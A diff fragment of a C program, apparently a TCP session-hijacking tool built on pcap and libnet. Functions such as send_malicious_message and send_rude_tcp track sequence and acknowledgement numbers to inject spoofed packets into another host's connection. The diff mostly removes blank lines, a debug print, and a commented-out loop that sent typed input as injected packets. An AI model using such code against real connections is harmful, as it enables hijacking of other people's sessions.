@@ -51,10 +51,7 @@ void leaveserver(int sig) {
 			rudemsg,
 			strlen(rudemsg)
 		);	
-	
 	}
-	
-
 	pcap_close(handler);
     libnet_destroy(netcons);
     exit(0);
@@ -62,8 +59,6 @@ void leaveserver(int sig) {
 
 
 void send_malicious_message(uint32_t seq, uint32_t ack) {
-
-	printf("Sending Malicious Message...\n");	
 	uint32_t current_seq = seq;
 	uint32_t current_ack = ack;
 
@@ -91,31 +86,7 @@ void send_malicious_message(uint32_t seq, uint32_t ack) {
 	global_seq = current_seq;
 	global_ack = current_ack;
 
-	/*
-	printf("H I J A C K E D B O Y E S\n");
-	printf("-------------------------\n");
-
-	while(fgets(rudebuffer, sizeof(rudebuffer)-1, stdin)) {
-		send_rude_tcp(
-			netcons,
-			srcip,
-			dstip,
-			srcport,
-			dstport,
-			TCP_PUSH | TCP_ACK,
-			current_seq,
-			current_ack,
-			rudebuffer,
-			strlen(rudebuffer)
-		);
-		current_seq += strlen(rudebuffer);
-		global_seq = current_seq;
-		memset(&rudebuffer, 0, sizeof(rudebuffer));
-	}
-	printf("Goodbye!\n");
-	*/
-
-	// Block, waiting for SIGINT and SIGQUIT
+	// Poll, waiting for SIGINT or SIGQUIT
 	for(;;) {
 
 	}
@@ -215,7 +186,6 @@ int main (int argc, char** argv) {
 	);
 
 	hijacked = false;
-		
 	if ((handler = open_pcap_socket_filtered(device, filterbuf))) {
 		if ((netcons = open_libnet_handler(device))) {
 			
